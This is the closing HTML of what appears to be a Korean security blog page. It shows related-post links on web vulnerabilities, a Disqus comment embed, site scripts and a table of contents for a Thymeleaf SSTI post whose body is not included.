                <img src="/p/prototype-pollution-%EC%B7%A8%EC%95%BD%EC%A0%90/security.d51859d8670fa595c8ca803db2a5aece_hua86146557b2012f829fdc26a39bf75dc_509252_250x150_fill_q75_box_smart1.jpg" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post Prototype Pollution 취약점"
                        
                        data-hash="md5-1RhZ2GcPpZXIyoA9sqWuzg==">
                
            </div>
        
        <div class="article-details">
            <h2 class="article-title">Prototype Pollution 취약점</h2>
        </div>
    </a>
</article>
                
                    
<article class="has-image">
    <a href="/p/deeplink-%EC%B7%A8%EC%95%BD%EC%A0%90/">
        
        
            <div class="article-image">
                <img src="/p/deeplink-%EC%B7%A8%EC%95%BD%EC%A0%90/security.d51859d8670fa595c8ca803db2a5aece_hua86146557b2012f829fdc26a39bf75dc_509252_250x150_fill_q75_box_smart1.jpg" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post Deeplink 취약점"
                        
                        data-hash="md5-1RhZ2GcPpZXIyoA9sqWuzg==">
                
            </div>
        
        <div class="article-details">
            <h2 class="article-title">Deeplink 취약점</h2>
        </div>
    </a>
</article>
                
                    
<article class="has-image">
    <a href="/p/web-hacking-css-injection/">
        
        
            <div class="article-image">
                <img src="/p/web-hacking-css-injection/security.d51859d8670fa595c8ca803db2a5aece_hua86146557b2012f829fdc26a39bf75dc_509252_250x150_fill_q75_box_smart1.jpg" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post [WEB Hacking] CSS injection"
                        
                        data-hash="md5-1RhZ2GcPpZXIyoA9sqWuzg==">
                
            </div>
        
        <div class="article-details">
            <h2 class="article-title">[WEB Hacking] CSS injection</h2>
        </div>
    </a>
</article>
                
                    
<article class="has-image">
    <a href="/p/web-hacking-relative-path-overwrite/">
        
        
            <div class="article-image">
                <img src="/p/web-hacking-relative-path-overwrite/security.d51859d8670fa595c8ca803db2a5aece_hua86146557b2012f829fdc26a39bf75dc_509252_250x150_fill_q75_box_smart1.jpg" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post [WEB Hacking] Relative Path OverWrite"
                        
                        data-hash="md5-1RhZ2GcPpZXIyoA9sqWuzg==">
                
            </div>
        
        <div class="article-details">
            <h2 class="article-title">[WEB Hacking] Relative Path OverWrite</h2>
        </div>
    </a>
</article>
                
                    
<article class="has-image">
    <a href="/p/dirb/">
        
        
            <div class="article-image">
                <img src="/p/dirb/security.d51859d8670fa595c8ca803db2a5aece_hua86146557b2012f829fdc26a39bf75dc_509252_250x150_fill_q75_box_smart1.jpg" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post dirb"
                        
                        data-hash="md5-1RhZ2GcPpZXIyoA9sqWuzg==">
                
            </div>
        
        <div class="article-details">
            <h2 class="article-title">dirb</h2>
        </div>
    </a>
</article>
                
            </div>
        </div>
    
</aside>

     
    
        
    <div class="disqus-container">
    <div id="disqus_thread"></div>
<script type="application/javascript">
    var disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "appealso-github-io" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</div>

<style>
    .disqus-container {
        background-color: var(--card-background);
        border-radius: var(--card-border-radius);
        box-shadow: var(--shadow-l1);
        padding: var(--card-padding);
    }
</style>

<script>
    window.addEventListener('onColorSchemeChange', (e) => {
        if (DISQUS) {
            DISQUS.reset({
                reload: true
            });
        }
    })
</script>

    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2022 - 
        
        2023 SooHo&#39;s Blog
    </section>
    
    <section class="powerby">
        
    </section>
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1842197916935789" crossorigin="anonymous"></script>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer="true"
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer="true"
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
            >

    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1842197916935789"
     crossorigin="anonymous"></script>


            </main>
    
        <aside class="sidebar right-sidebar sticky">
            <section class="widget archives">
                <h1 class="widget-title section-title" style="text-align:center">TABLE OF CONTENTS</h1>
                
                <div class="widget--toc">
                    <nav id="TableOfContents">
  <ol>
    <li><a href="#thymeleaf">Thymeleaf?</a></li>
    <li><a href="#ssti">SSTI?</a></li>
    <li><a href="#thymleaf-ssti">Thymleaf SSTI</a></li>
    <li><a href="#thymeleaf-예제">Thymeleaf 예제</a></li>
    <li><a href="#bypass-filter">Bypass filter</a></li>
    <li><a href="#참고">참고</a></li>
  </ol>
</nav>
                </div>
            </section>
        </aside>
    

        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
                defer="false"
                >
            </script><script type="text/javascript" src="/ts/main.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
